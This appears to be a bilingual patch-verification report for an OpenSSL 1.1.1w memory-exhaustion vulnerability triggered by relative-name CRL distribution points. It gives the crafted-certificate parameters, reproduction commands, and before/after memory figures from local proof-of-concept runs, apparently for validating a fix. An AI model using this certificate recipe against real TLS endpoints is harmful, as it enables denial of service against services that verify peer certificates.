# 029 / CVE-2026-35189 / Relative-CRLDP-excessive-memory

Log file / ログファイル: `20261102_124932_029of033_CVE-2026-35189_Relative-CRLDP-excessive-memory.log` (in /home/user/work/deliver/ipalongpatch_info/logs/)

Verdict / 判定: **PASS**

## Vulnerability mechanism (as observed in the code) / 脆弱性のメカニズム (コード上の観察)

`x509v3_cache_extensions()` (crypto/x509v3/v3_purp.c) -> `setup_crldp()` -> `setup_dp()` runs for every certificate that is verified. In unpatched 1.1.1w `setup_dp()` calls `DIST_POINT_set_dpname()` (crypto/x509v3/v3_crld.c) for every nameRelativeToCRLIssuer distribution point, which does `X509_NAME_dup(iname)` of the whole issuer name (entries + DER + canonical encoding) and appends the RDN. Memory = (#relative CRLDPs) x (issuer name size): a < 100 KiB certificate (accepted by a default TLS peer) can cost hundreds of MiB. Patch 029 removes the computation from `setup_dp()`; `crl_crldp_check()` (x509_vfy.c) computes the full name on demand via `crldp_full_name()`/`ossl_dist_point_name_full()` only when matching a CRL's IDP, and frees it.

`x509v3_cache_extensions()` (crypto/x509v3/v3_purp.c) → `setup_crldp()` → `setup_dp()` は検証されるすべての証明書で実行される。未修正 1.1.1w の `setup_dp()` は nameRelativeToCRLIssuer 形式の配布点ごとに `DIST_POINT_set_dpname()` (crypto/x509v3/v3_crld.c) を呼び、発行者名全体 (エントリ + DER + 正規化符号化) を `X509_NAME_dup(iname)` して RDN を付加する。メモリ = (相対 CRLDP 数) × (発行者名サイズ): 100 KiB 未満 (既定の TLS ピアが受け入れる) の証明書で数百 MiB を消費させられる。パッチ 029 は `setup_dp()` から計算を除き、`crl_crldp_check()` (x509_vfy.c) が CRL の IDP 照合時にのみ `crldp_full_name()`/`ossl_dist_point_name_full()` で完全名を必要時計算して解放する。

## PoC design / PoC の設計

`gen_crldp_cert.c` builds a self-signed certificate with 3000 relative-name CRLDPs ({CN=c}) and an issuer of 260 x 64-char OU attributes (DER 87798 bytes < 102400). `memwrap.c` reports a child's peak RSS. Compared BASE vs PATCHED: `openssl x509 -noout -purpose`, `openssl verify -CAfile cert cert`, and `s_client` verifying the certificate presented by `s_server` in a real handshake. gdb counts `DIST_POINT_set_dpname()` calls. `regress_idp.sh` checks CRL matching by IDP for a single relative-name CRLDP.

`gen_crldp_cert.c` は相対名 CRLDP 3000 個 ({CN=c}) と 64 文字 OU 属性 260 個の発行者名を持つ自己署名証明書 (DER 87798 バイト < 102400) を作る。`memwrap.c` は子プロセスのピーク RSS を報告する。BASE と PATCHED で `openssl x509 -noout -purpose`、`openssl verify -CAfile cert cert`、実ハンドシェイクで `s_server` の提示証明書を検証する `s_client` を比較。gdb で `DIST_POINT_set_dpname()` の呼び出し回数を数える。`regress_idp.sh` は相対名 CRLDP 1 個の証明書に対する IDP による CRL 照合を確認する。

## Observed behaviour BEFORE the patch (evidence excerpts) / 修正前の挙動 (証拠の抜粋)

```
wrote big_crldp.pem: 3000 relative-name CRL distribution points, issuer name with 260 OU attributes of 64 chars
  (issuer DER 19549 bytes), certificate DER 87798 bytes      (SSL_MAX_CERT_LIST_DEFAULT = 102400 -> accepted)
$ ./memwrap openssl(BASE) x509 -in big_crldp.pem -noout -purpose     -> maxrss 261 MB  wall ~5.6 s
$ ./memwrap openssl(BASE) verify -CAfile big_crldp.pem big_crldp.pem  -> maxrss 515 MB  wall ~11.3 s
$ ./memwrap openssl(BASE) s_client -connect 127.0.0.1:14434 -CAfile big_crldp.pem -verify_return_error
   Verify return code: 0 (ok)                                      -> maxrss 516 MB  wall ~11.6 s
$ LD_LIBRARY_PATH=$B gdb ... 'break DIST_POINT_set_dpname' 'ignore 1 2999' run ... openssl(BASE) x509 -purpose
Breakpoint 1, DIST_POINT_set_dpname (dpn=..., iname=...) at crypto/x509v3/v3_crld.c:485
#1 setup_dp v3_purp.c:331  #2 setup_crldp v3_purp.c:342  #3 x509v3_cache_extensions v3_purp.c:531  #4 X509_check_purpose
        breakpoint already hit 3000 times
```

(baseline RSS of the tool: about 5 MB)

(ツールの基準 RSS: 約 5 MB)

## Observed behaviour AFTER the patch / 修正後の挙動

```
$ ./memwrap openssl(PATCHED) x509 -in big_crldp.pem -noout -purpose     -> maxrss 7 MB  wall 0.04 s
$ ./memwrap openssl(PATCHED) verify -CAfile big_crldp.pem big_crldp.pem  -> maxrss 8 MB  wall 0.02 s
$ ./memwrap openssl(PATCHED) s_client ... -CAfile big_crldp.pem           -> Verify return code: 0 (ok), maxrss 8 MB
$ gdb ... 'break DIST_POINT_set_dpname' 'break ossl_dist_point_name_full' run ... openssl(PATCHED) x509 -purpose
[Inferior 1 exited normally]   (neither breakpoint hit)
```

## Regression check / 回帰確認

`regress_idp.sh` (PATCHED): leaf with CRLDP "Relative Name: CN = crl1"; CRL A (IDP relative name CN=crl1) OK, CRL B (IDP full dirName "CN = Regress IDP CA, CN = crl1") OK, CRL C (IDP relative name CN=crl2) -> "error 44 ... Different CRL scope", revoked leaf with re-issued CRL A -> "certificate revoked". Identical results on BASE. valgrind on the patched tool (leaf+CRL A, and the big certificate): no errors, no leaks.

`regress_idp.sh` (PATCHED): CRLDP "Relative Name: CN = crl1" のリーフ; CRL A (IDP 相対名 CN=crl1) OK、CRL B (IDP 完全 dirName "CN = Regress IDP CA, CN = crl1") OK、CRL C (IDP 相対名 CN=crl2) → "error 44 ... Different CRL scope"、失効後の再発行 CRL A → "certificate revoked"。BASE でも同一結果。修正済みツールの valgrind (リーフ+CRL A、巨大証明書): エラー・リーク無し。

## How to reproduce manually (step-by-step commands a human can run) / 手動再現手順

```
cd /home/user/work/poc/029_CVE-2026-35189
B=/home/user/work/base/openssl-1.1.1w; P=/home/user/work/patched/build
PS=/home/user/work/patched/openssl-1.1.1w-ipalongpatch_20261102
gcc -g -O0 -Wall -I$P/include -I$PS/include gen_crldp_cert.c -L$P -lcrypto -Wl,-rpath,$P -o gen_crldp_cert
gcc -O2 -Wall memwrap.c -o memwrap
./gen_crldp_cert 3000 260 64 big.pem big.key
./memwrap $B/util/shlib_wrap.sh $B/apps/openssl x509 -in big.pem -noout -purpose    # ~260 MB
./memwrap $P/util/shlib_wrap.sh $P/apps/openssl x509 -in big.pem -noout -purpose    # ~8 MB
$P/util/shlib_wrap.sh $P/apps/openssl s_server -accept 14434 -cert big.pem -key big.key -naccept 1 -quiet &
./memwrap $B/util/shlib_wrap.sh $B/apps/openssl s_client -connect 127.0.0.1:14434 -CAfile big.pem -verify_return_error < /dev/null   # ~516 MB
LD_LIBRARY_PATH=$B gdb -q -batch -ex 'set breakpoint pending on' -ex 'break DIST_POINT_set_dpname' -ex 'ignore 1 2999' -ex run -ex bt -ex 'info breakpoints' -ex kill --args $B/apps/openssl x509 -in big.pem -noout -purpose
./regress_idp.sh $P patched     # CRL matching regression
./run_poc.sh                    # everything, with verdict
```

## Limitations / notes / 制限事項・注記

RSS varies by a few MB between runs on the shared VM; the >30x gap is stable. The BASE figure scales with issuer length x CRLDP count (the chosen values are near the optimum under the 100 KiB limit). Only the TLS client side was measured (servers requesting client certificates use the same path). CRL matching regression covers relative and full IDP names; no CRL fetching is involved. The first run_poc.sh run had a gdb pending-breakpoint script issue (fixed, re-run, both outputs kept).

共有 VM 上で RSS は数 MB 変動するが 30 倍超の差は安定。BASE の数値は発行者長 × CRLDP 数で増え (選択値は 100 KiB 上限下でほぼ最適)。計測は TLS クライアント側のみ (クライアント証明書を要求するサーバも同経路)。CRL 照合の回帰確認は相対・完全 IDP 名を対象、CRL 取得は関与しない。run_poc.sh 初回は gdb の pending ブレークポイントの問題 (修正・再実行、両出力を保持)。
